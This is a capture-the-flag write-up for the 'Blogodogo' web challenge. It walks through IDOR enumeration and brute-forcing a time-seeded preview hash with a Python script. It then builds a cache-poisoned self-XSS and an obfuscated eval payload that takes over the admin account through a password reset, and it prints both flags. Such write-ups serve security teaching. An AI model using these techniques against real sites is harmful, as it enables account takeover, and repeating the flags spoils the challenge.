# Blogodogo

### Category

Web

### Description

Try to see the content of the secret note of the administator user.

You can deploy an instance on : **https://deploy.heroctf.fr**<br>

Format : **Hero{flag}**<br>
Author : **xanhacks**

### Files

- [blog.zip](blog.zip)

### Write Up

#### Step 1

1. IDOR to find admin user
2. Guess PREVIEW_HASH based on time
3. Access to a referral code to register your account

Find admin user using IDOR: http://dyn-01.heroctf.fr:13279/author/17

Then, you can list the admin's posts and find a secret post:

```
Secret blog post (draft)
Secret post!!

Posted by on 2023-05-13 02:53
```

You can't read it because its a draft, however you can abuse the preview function to see a draft (private) post. To do that, you need to have the correct `preview_hash`.

Example:

=> `http://dyn-01.heroctf.fr:13279/post/preview/<preview_hash>`

The `preview_hash` is generated base on the current time:

```python
def generate_hash(timestamp=None):
    """Generate hash for post preview."""
    if timestamp:
        seed(timestamp)
    else:
        seed(int(datetime.now().timestamp()))

    return randbytes(32).hex()
```

As you have the time of the creation of the post (`2023-05-13 02:53`), you can regenerate the preview hash. The only things to do is to bruteforce the seconds. You can make a little script to do that:

```python
dt = datetime(year=2023, month=5,
        day=13, hour=2, minute=53, second=0)

timestamp = int(dt.timestamp()) + 2 * 3600 # UTC+2 !
for ts in range(timestamp, timestamp + 60):
    preview_hash = generate_hash(timestamp=ts)
    resp = requests.get(HOST + "/post/preview/" + preview_hash)
    if "Report a post" in resp.text:
        print(preview_hash)
        print(resp.text)
```

Then, you successfully recover the post:

- http://dyn-01.heroctf.fr:13279/post/preview/20030b5d29001f7856c0e7e034e00b8b715d24237f67cf2ea6ec34faee3bb08b

```
Well played ! You can now register users !
Here is the referral code: 83d99a0ac225079db31b44a2e58b19f0.
Hero{pr3333vi333wwwws_5973791}
```

#### Step 2

1. Injection javascript: XSS in your profile
2. Make sure your profile is in the cache using the same username of the admin
3. ATO using password reset on admin

On our profile page, you have the following javascript snippet:

```html
<script>
    addEventListener('DOMContentLoaded', (event) => {
        let hash = window.location.hash;
        if (hash !== '') {
            let button = document.getElementById(hash.slice(1));
            button.click();
        }
    });
</script>
```

You can set the custom URL in our profile to `javascript:alert()`, then use the snippet above to auto-click on the link on the page load.

- http://dyn-01.heroctf.fr:13279/profile#author-website -> Will trigger the alert by clicking on the link.

However, this is only a self-XSS because it affects the `/profile`.

But you can abuse the cache service to inject your self-XSS into another account.

```python
key_name_url = "profile_" + current_user.username.lower() + "_url"
key_name_username = "profile_" + current_user.username.lower() + "_username" 

cache_url, cache_username = redis_client.get(key_name_url), redis_client.get(key_name_username)
if not cache_url or not cache_username:
    redis_client.set(key_name_username, current_user.username)
```

The username is lowered for the cache key, so `admin`, `AdMiN` and `ADMIN` will shares the same cache. So, you can create an account named `ADMIN` a inject yourself. The profile will be reflected into the `admin` account.

The final goal is to take over the admin account but we cannot exfiltrate cookies because it's HTTPOnly. However there is a vulnerability on the reset password feature. The old password is not verified, so you can change the password of the vicitim (admin).

XSS:

```js
document.getElementById("username").value = "admin";
document.getElementById("new_password").value = "password";
document.getElementById("new_password_confirm").value = "password";
document.getElementById("submit").click()

// equals to:

javascript:eval(atob(`ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInVzZXJuYW1lIikudmFsdWUgPSAiYWRtaW4iOwpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibmV3X3Bhc3N3b3JkIikudmFsdWUgPSAicGFzc3dvcmQiOwpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibmV3X3Bhc3N3b3JkX2NvbmZpcm0iKS52YWx1ZSA9ICJwYXNzd29yZCI7CmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJzdWJtaXQiKS5jbGljaygp`))
```

Send the following link to the bot: `http://localhost:5000/profile#author-website`

Login in to the admin account using the new password `admin:password`.

### Flag

- Hero{pr3333vi333wwwws_5973791}
- Hero{very_n1ce_move_into_c4che}
